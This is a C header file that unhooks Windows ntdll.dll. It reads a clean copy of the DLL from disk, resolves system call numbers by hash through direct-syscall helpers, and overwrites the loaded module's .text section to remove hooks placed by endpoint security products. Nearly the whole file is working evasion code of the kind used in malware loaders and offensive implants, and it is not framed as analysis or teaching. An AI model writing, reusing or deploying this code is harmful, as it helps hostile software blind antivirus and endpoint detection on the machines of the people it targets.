#ifndef UNHOOK_H
#define UNHOOK_H

#include <stdio.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdlib.h>
#include <windows.h>
#include <winternl.h>
#include <string.h>
#include "debug.c"
#include "obf.c"
#include "syscall.c"
#include "syscallresolve.c"
#include "hashes.h"


#define IMAGE_DOS_SIGNATURE     0x5A4D
#define IMAGE_NT_SIGNATURE      0x00004550
#define PAGE_EXECUTE_READ       0x20
#define PAGE_EXECUTE_READWRITE  0x40
#define PAGE_READONLY           0x02
#define SECTION_MAP_READ        0x0004
#define MEM_RELEASE            0x8000



typedef struct _UNICODE_STRING_UNHOOK {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR Buffer;
} UNICODE_STRING_UNHOOK, *PUNICODE_STRING_UNHOOK;

typedef struct _OBJECT_ATTRIBUTES_UNHOOK {
    ULONG Length;
    HANDLE RootDirectory;
    PUNICODE_STRING_UNHOOK ObjectName;
    ULONG Attributes;
    PVOID SecurityDescriptor;
    PVOID SecurityQualityOfService;
} OBJECT_ATTRIBUTES_UNHOOK, *POBJECT_ATTRIBUTES_UNHOOK;


typedef struct _SYSCALL_NUMBERS {
    uint16_t nt_open_section;
    uint16_t nt_map_view_of_section;
    uint16_t nt_unmap_view_of_section;
    uint16_t nt_close;
    uint16_t nt_protect_virtual_memory;
    uint16_t nt_write_virtual_memory;
    uint16_t nt_free_virtual_memory;
    uint16_t nt_allocate_virtual_memory;
    uint16_t nt_create_process;
    uint16_t nt_query_information_process;
    uint16_t nt_read_virtual_memory;
} SYSCALL_NUMBERS, *PSYSCALL_NUMBERS;


bool get_syscall_numbers(PSYSCALL_NUMBERS numbers);
uintptr_t get_current_ntdll_base(void);
bool load_fresh_ntdll(PSYSCALL_NUMBERS syscalls, uintptr_t* base_address, uint32_t* view_size);
bool copy_text_section(uintptr_t current_base, uintptr_t fresh_base, PSYSCALL_NUMBERS syscalls);
bool nt_map_view_of_section_unhook(HANDLE section_handle, uint32_t size_of_image, 
                                   PSYSCALL_NUMBERS syscalls, uintptr_t* base_address, uintptr_t* view_size);
void init_unicode_string_unhook(PUNICODE_STRING_UNHOOK us, PCWSTR s);
HANDLE get_current_process_handle(void);
bool unhook_ntdll(void);


HANDLE get_current_process_handle(void) {
    return (HANDLE)-1;
}


void init_unicode_string_unhook(PUNICODE_STRING_UNHOOK us, PCWSTR s) {
    if (s == NULL) {
        us->Length = 0;
        us->MaximumLength = 0;
        us->Buffer = NULL;
        return;
    }
    

    size_t len = 0;
    while (s[len] != 0) len++;
    
    us->Length = (USHORT)(len * sizeof(WCHAR));
    us->MaximumLength = us->Length + sizeof(WCHAR);
    us->Buffer = (PWSTR)s;
}


bool get_syscall_numbers(PSYSCALL_NUMBERS numbers) {
    debug_printfln("UNHOOK", "Resolving syscall numbers...\n");
    

    struct {
        const char* name;
        uint32_t hash;
        uint16_t* target;
    } functions[] = {
        {"NtOpenSection", 0, &numbers->nt_open_section},
        {"NtClose", H_CLSE, &numbers->nt_close},
        {"NtProtectVirtualMemory", H_PRTCTVR, &numbers->nt_protect_virtual_memory},
        {"NtWriteVirtualMemory", H_WRTVRTL, &numbers->nt_write_virtual_memory},
        {"NtFreeVirtualMemory", H_FRVRTLM, &numbers->nt_free_virtual_memory},
        {"NtAllocateVirtualMemory", 0, &numbers->nt_allocate_virtual_memory},
        {"NtCreateProcess", H_CRTPRCS, &numbers->nt_create_process},
        {"NtQueryInformationProcess", 0, &numbers->nt_query_information_process},
        {"NtReadVirtualMemory", 0, &numbers->nt_read_virtual_memory}
    };
    
    size_t func_count = sizeof(functions) / sizeof(functions[0]);
    
    for (size_t i = 0; i < func_count; i++) {
        uint32_t hash = functions[i].hash;
        if (hash == 0) {
            hash = get_hash(functions[i].name);
        }
        

        uint16_t num = guess_syscall_number(hash);
        if (num != 0) {
            debug_printfln("UNHOOK", "Got syscall number %d for %s via guess_syscall_number\n", 
                          num, functions[i].name);
            *(functions[i].target) = num;
            continue;
        }
        

        debug_printfln("UNHOOK", "guess_syscall_number failed for %s, trying get_syscall_and_address...\n", 
                      functions[i].name);
        uintptr_t addr;
        num = get_syscall_and_address(hash, &addr);
        if (num == 0) {
            debug_printfln("UNHOOK", "Failed to get syscall number for %s using both methods\n", 
                          functions[i].name);
            return false;
        }
        
        debug_printfln("UNHOOK", "Got syscall number %d for %s via get_syscall_and_address\n", 
                      num, functions[i].name);
        *(functions[i].target) = num;
    }
    
    debug_printfln("UNHOOK", "Successfully resolved %zu syscalls\n", func_count);
    return true;
}


uintptr_t get_current_ntdll_base(void) {
    debug_printfln("UNHOOK", "Getting current ntdll base address...\n");
    
    uint32_t ntdll_hash = MOD_NTDLL_DLL;
    uintptr_t base = get_module_base(ntdll_hash);
    
    if (base == 0) {
        debug_printfln("UNHOOK", "Failed to get ntdll base address\n");
        return 0;
    }
    
    debug_printfln("UNHOOK", "Current ntdll base: 0x%p\n", (void*)base);
    return base;
}


bool load_fresh_ntdll(PSYSCALL_NUMBERS syscalls, uintptr_t* base_address, uint32_t* view_size) {
    (void)syscalls; // Not needed for file-based approach
    debug_printfln("UNHOOK", "Loading fresh ntdll directly from file system...\n");
    
    // Try common ntdll.dll file paths
    const char* ntdll_paths[] = {
        "C:\\Windows\\System32\\ntdll.dll",
        "C:\\Windows\\SysWOW64\\ntdll.dll",  // 32-bit on 64-bit systems
        "%SystemRoot%\\System32\\ntdll.dll"
    };
    
    FILE* file = NULL;
    for (size_t i = 0; i < sizeof(ntdll_paths)/sizeof(ntdll_paths[0]); i++) {
        debug_printfln("UNHOOK", "Trying to open: %s\n", ntdll_paths[i]);
        file = fopen(ntdll_paths[i], "rb");
        if (file) {
            debug_printfln("UNHOOK", "Successfully opened: %s\n", ntdll_paths[i]);
            break;
        }
    }
    
    if (!file) {
        debug_printfln("UNHOOK", "Failed to open ntdll.dll from any known path\n");
        return false;
    }
    
    // Get file size
    fseek(file, 0, SEEK_END);
    long file_size = ftell(file);
    fseek(file, 0, SEEK_SET);
    
    if (file_size <= 0) {
        debug_printfln("UNHOOK", "Invalid file size: %ld\n", file_size);
        fclose(file);
        return false;
    }
    
    debug_printfln("UNHOOK", "File size: %ld bytes\n", file_size);
    
    // Allocate buffer for the entire file
    uintptr_t file_buffer = (uintptr_t)malloc((size_t)file_size);
    if (!file_buffer) {
        debug_printfln("UNHOOK", "Failed to allocate %ld bytes for file buffer\n", file_size);
        fclose(file);
        return false;
    }
    
    // Read the entire file
    size_t bytes_read = fread((void*)file_buffer, 1, (size_t)file_size, file);
    fclose(file);
    
    if (bytes_read != (size_t)file_size) {
        debug_printfln("UNHOOK", "Failed to read file: got %zu bytes, expected %ld\n", bytes_read, file_size);
        free((void*)file_buffer);
        return false;
    }
    
    debug_printfln("UNHOOK", "Successfully read %zu bytes from ntdll.dll\n", bytes_read);
    
    // Verify DOS header
    PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER)file_buffer;
    if (dos_header->e_magic != IMAGE_DOS_SIGNATURE) {
        debug_printfln("UNHOOK", "Invalid DOS signature: 0x%x\n", dos_header->e_magic);
        free((void*)file_buffer);
        return false;
    }
    
    // Verify NT headers
    PIMAGE_NT_HEADERS nt_headers = (PIMAGE_NT_HEADERS)(file_buffer + dos_header->e_lfanew);
    if (nt_headers->Signature != IMAGE_NT_SIGNATURE) {
        debug_printfln("UNHOOK", "Invalid NT signature: 0x%x\n", nt_headers->Signature);
        free((void*)file_buffer);
        return false;
    }
    
    uint32_t image_size = nt_headers->OptionalHeader.SizeOfImage;
    debug_printfln("UNHOOK", "PE is valid, image size: %lu bytes\n", image_size);
    
    // Allocate buffer for properly mapped image
    uintptr_t image_buffer = (uintptr_t)malloc(image_size);
    if (!image_buffer) {
        debug_printfln("UNHOOK", "Failed to allocate %lu bytes for image buffer\n", image_size);
        free((void*)file_buffer);
        return false;
    }
    
    // Zero the image buffer
    memset((void*)image_buffer, 0, image_size);
    
    // Copy headers
    memcpy((void*)image_buffer, (void*)file_buffer, nt_headers->OptionalHeader.SizeOfHeaders);
    debug_printfln("UNHOOK", "Copied %lu bytes of headers\n", nt_headers->OptionalHeader.SizeOfHeaders);
    
    // Copy sections to their virtual addresses
    uintptr_t sections_offset = (uintptr_t)dos_header->e_lfanew + sizeof(IMAGE_NT_HEADERS);
    int num_sections = nt_headers->FileHeader.NumberOfSections;
    
    for (int i = 0; i < num_sections; i++) {
        PIMAGE_SECTION_HEADER section = (PIMAGE_SECTION_HEADER)(file_buffer + sections_offset + 
                                                               i * sizeof(IMAGE_SECTION_HEADER));
        
        char section_name[9] = {0};
        memcpy(section_name, section->Name, 8);
        
        debug_printfln("UNHOOK", "Copying section %s: RVA=0x%x, Size=0x%x, FileOffset=0x%x\n", 
                      section_name, section->VirtualAddress, section->Misc.VirtualSize, section->PointerToRawData);
        
        if (section->PointerToRawData > 0 && section->Misc.VirtualSize > 0) {
            uintptr_t dest = image_buffer + section->VirtualAddress;
            uintptr_t src = file_buffer + section->PointerToRawData;
            uint32_t copy_size = (section->SizeOfRawData < section->Misc.VirtualSize) ? 
                                section->SizeOfRawData : section->Misc.VirtualSize;
            
            memcpy((void*)dest, (void*)src, copy_size);
        }
    }
    
    // Free the file buffer, we only need the mapped image now
    free((void*)file_buffer);
    
    debug_printfln("UNHOOK", "Successfully loaded and mapped clean ntdll from file\n");
    
    *base_address = image_buffer;
    *view_size = image_size;
    return true;
}


bool copy_text_section(uintptr_t current_base, uintptr_t fresh_base, PSYSCALL_NUMBERS syscalls) {
    debug_printfln("UNHOOK", "copy_text_section called: currentBase=0x%p, freshBase=0x%p\n", 
                  (void*)current_base, (void*)fresh_base);
    
    debug_printfln("UNHOOK", "Reading DOS header from freshBase...\n");
    PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER)fresh_base;
    if (dos_header->e_magic != IMAGE_DOS_SIGNATURE) {
        debug_printfln("UNHOOK", "Invalid DOS signature in fresh ntdll: 0x%x\n", dos_header->e_magic);
        return false;
    }
    debug_printfln("UNHOOK", "DOS header valid, e_lfanew=0x%x\n", dos_header->e_lfanew);
    
    debug_printfln("UNHOOK", "Reading NT headers...\n");
    PIMAGE_NT_HEADERS nt_headers = (PIMAGE_NT_HEADERS)(fresh_base + dos_header->e_lfanew);
    if (nt_headers->Signature != IMAGE_NT_SIGNATURE) {
        debug_printfln("UNHOOK", "Invalid NT signature in fresh ntdll: 0x%x\n", nt_headers->Signature);
        return false;
    }
    
    uint32_t image_size = nt_headers->OptionalHeader.SizeOfImage;
    debug_printfln("UNHOOK", "Image size: %lu bytes\n", image_size);
    
    uintptr_t sections_offset = (uintptr_t)dos_header->e_lfanew + sizeof(IMAGE_NT_HEADERS);
    int num_sections = nt_headers->FileHeader.NumberOfSections;
    debug_printfln("UNHOOK", "Number of sections: %d\n", num_sections);
    
    PIMAGE_SECTION_HEADER text_section = NULL;
    for (int i = 0; i < num_sections; i++) {
        PIMAGE_SECTION_HEADER section_header = (PIMAGE_SECTION_HEADER)(fresh_base + sections_offset + 
                                                                       i * sizeof(IMAGE_SECTION_HEADER));
        
        char section_name[9] = {0};
        memcpy(section_name, section_header->Name, 8);
        
        debug_printfln("UNHOOK", "Section %d: %s (VirtualAddress=0x%x, VirtualSize=0x%x)\n", 
                      i, section_name, section_header->VirtualAddress, section_header->Misc.VirtualSize);
        
        if (strcmp(section_name, ".text") == 0) {
            text_section = section_header;
            break;
        }
    }
    
    if (text_section == NULL) {
        debug_printfln("UNHOOK", ".text section not found in fresh ntdll\n");
        return false;
    }
    
    debug_printfln("UNHOOK", "Found .text section: VirtualAddress=0x%x, VirtualSize=0x%x\n", 
                  text_section->VirtualAddress, text_section->Misc.VirtualSize);
    
    uintptr_t text_addr = fresh_base + text_section->VirtualAddress;
    uintptr_t text_size = text_section->Misc.VirtualSize;
    
    debug_printfln("UNHOOK", "Text section address in fresh ntdll: 0x%p, size: %lu\n", 
                  (void*)text_addr, text_size);
    
    uintptr_t current_text_addr = current_base + text_section->VirtualAddress;
    
    ULONG old_protect = 0;
    uintptr_t addr = current_text_addr;
    uintptr_t size = text_size;
    
    uintptr_t protect_args[] = {
        (uintptr_t)get_current_process_handle(),
        (uintptr_t)&addr,
        (uintptr_t)&size,
        PAGE_EXECUTE_READWRITE,
        (uintptr_t)&old_protect
    };
    
    uintptr_t status = external_syscall(syscalls->nt_protect_virtual_memory, protect_args, 5);
    
    if (status != 0) {
        debug_printfln("UNHOOK", "NtProtectVirtualMemory failed (making writable): 0x%lx\n", status);
        return false;
    }
    
    debug_printfln("UNHOOK", "Copying %lu bytes from 0x%p to 0x%p\n", text_size, (void*)text_addr, (void*)current_text_addr);
    memcpy((void*)current_text_addr, (void*)text_addr, text_size);
    debug_printfln("UNHOOK", "Successfully copied %lu bytes from fresh .text section\n", text_size);
    
    addr = current_text_addr;
    size = text_size;
    
    uintptr_t restore_args[] = {
        (uintptr_t)get_current_process_handle(),
        (uintptr_t)&addr,
        (uintptr_t)&size,
        old_protect,
        (uintptr_t)&old_protect
    };
    
    status = external_syscall(syscalls->nt_protect_virtual_memory, restore_args, 5);
    
    if (status != 0) {
        debug_printfln("UNHOOK", "NtProtectVirtualMemory failed (restoring protection): 0x%lx\n", status);
        return false;
    }
    
    return true;
}


bool unhook_ntdll(void) {
    debug_printfln("UNHOOK", "Attempting to unhook ntdll.dll by loading a fresh copy...\n");
    

    debug_printfln("UNHOOK", "Getting current ntdll base address...\n");
    uintptr_t current_ntdll_base = get_current_ntdll_base();
    if (current_ntdll_base == 0) {
        debug_printfln("UNHOOK", "Failed to get current ntdll base\n");
        return false;
    }
    debug_printfln("UNHOOK", "Current ntdll base: 0x%p\n", (void*)current_ntdll_base);
    

    debug_printfln("UNHOOK", "Resolving syscall numbers...\n");
    SYSCALL_NUMBERS syscalls = {0};
    if (!get_syscall_numbers(&syscalls)) {
        debug_printfln("UNHOOK", "Failed to get syscall numbers\n");
        return false;
    }
    debug_printfln("UNHOOK", "Successfully resolved syscalls\n");
    

    uintptr_t fresh_ntdll_base;
    uint32_t fresh_ntdll_size;
    if (!load_fresh_ntdll(&syscalls, &fresh_ntdll_base, &fresh_ntdll_size)) {
        debug_printfln("UNHOOK", "Failed to load fresh ntdll\n");
        return false;
    }
    
    debug_printfln("UNHOOK", "Fresh ntdll loaded at: 0x%p (size: %lu)\n", 
                  (void*)fresh_ntdll_base, fresh_ntdll_size);
    
    bool copy_success = copy_text_section(current_ntdll_base, fresh_ntdll_base, &syscalls);
    

    free((void*)fresh_ntdll_base);
    
    if (!copy_success) {
        debug_printfln("UNHOOK", "Failed to copy text section\n");
        return false;
    }
    
    debug_printfln("UNHOOK", "NTDLL unhooking completed successfully!\n");
    return true;
}

#endif // UNHOOK_H 